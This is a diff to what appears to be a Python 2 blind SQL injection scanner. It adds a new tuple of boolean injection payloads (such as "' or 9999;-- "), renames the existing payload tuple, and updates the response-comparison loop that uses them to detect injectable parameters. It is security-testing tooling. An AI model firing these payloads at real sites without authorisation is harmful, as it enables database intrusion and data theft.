@@ -8,7 +8,26 @@ import os
 import time  
 
 
-TF_OBJ = (
+TrueFalsePayload1 = (
+    #Single quotes
+    "' and 7777;-- ",
+    "' and 0=0;-- ",
+    "' or 9999;-- ",
+    "' and 0;-- ",
+
+    #numeric
+    " and 7777;-- ",
+    " and 0=0;-- ",
+    " or 9999;-- ",
+    " and 0;-- ",
+
+    #double quotes
+    '" and 7777;-- ',
+    '" and 0=0;-- ',
+    '" or 9999;-- ',
+    '" and 0;-- '
+)
+TrueFalsePayload = (
     #Single quotes
     "' and 7777='7777",
     "' and 0='0",
@@ -27,6 +46,7 @@ TF_OBJ = (
     '" or 7777="7777',
     '" and 7777="7778'
 )
+
 class BSqliRspDiff():
     def __init__(self, req, eq_limit=0.98):
         self._req = copy.deepcopy(req)
@@ -50,16 +70,16 @@ class BSqliRspDiff():
     def response_diff(self):
         req = self._req
         #true/false response comparison
-        for i in range(0,len(TF_OBJ)/4):
-            trueStm1 = TF_OBJ[i*4]
-            trueStm2 = TF_OBJ[i*4+1]
-            trueStm3 = TF_OBJ[i*4+2]
-            falseStm = TF_OBJ[i*4+3]
+        for i in range(0,len(TrueFalsePayload)/4):
+            trueStm1 = TrueFalsePayload[i*4]
+            trueStm2 = TrueFalsePayload[i*4+1]
+            trueStm3 = TrueFalsePayload[i*4+2]
+            falseStm = TrueFalsePayload[i*4+3]
             
-            trueQueryList1=request.getPayloadQueryList(req._query,trueStm1)
-            trueQueryList2=request.getPayloadQueryList(req._query,trueStm2)
-            trueQueryList3=request.getPayloadQueryList(req._query,trueStm3)
-            falseQueryList=request.getPayloadQueryList(req._query,falseStm)
+            trueQueryList1=request.get_payload_query_list(req._query,trueStm1)
+            trueQueryList2=request.get_payload_query_list(req._query,trueStm2)
+            trueQueryList3=request.get_payload_query_list(req._query,trueStm3)
+            falseQueryList=request.get_payload_query_list(req._query,falseStm)
 
             for j in range(len(trueQueryList1)):
 
@@ -89,9 +109,8 @@ class BSqliRspDiff():
                     print "!!!!!!!!!!!url:",self._req._url
                     print "*cleanRsp:",cleanRsp
                     print "*payloadRsp:",payloadRsp
-                    print "*******************************"
-                    print "\n"
-                    return result.Result([tmpReq1,tmpReq2,tmpReq3,tmpReq4],[rsp1,rsp2,rsp3,rsp4],TF_OBJ[i*4:i*4+4])
+                    print "*******************************\n"
+                    return result.Result([tmpReq1,tmpReq2,tmpReq3,tmpReq4],[rsp1,rsp2,rsp3,rsp4],TrueFalsePayload[i*4:i*4+4])
                 else:
                     tmpReq5 = copy.deepcopy(req)
                     tmpReq6 = copy.deepcopy(req)
@@ -106,9 +125,8 @@ class BSqliRspDiff():
                         print "!!!!!!!!!url:",self._req._url
                         print "*cleanRsp:",cleanRsp
                         print "*orRsp:",orRsp
-                        print "*******************************"                                       
-                        print "\n"
-                        return result.Result([tmpReq1,tmpReq2,tmpReq5,tmpReq6],[rsp1,rsp2,rsp5,rsp6],TF_OBJ[i*4:i*4+4]) 
+                        print "*******************************\n"                                       
+                        return result.Result([tmpReq1,tmpReq2,tmpReq5,tmpReq6],[rsp1,rsp2,rsp5,rsp6],TrueFalsePayload[i*4:i*4+4]) 
 
 
 def start(req): 
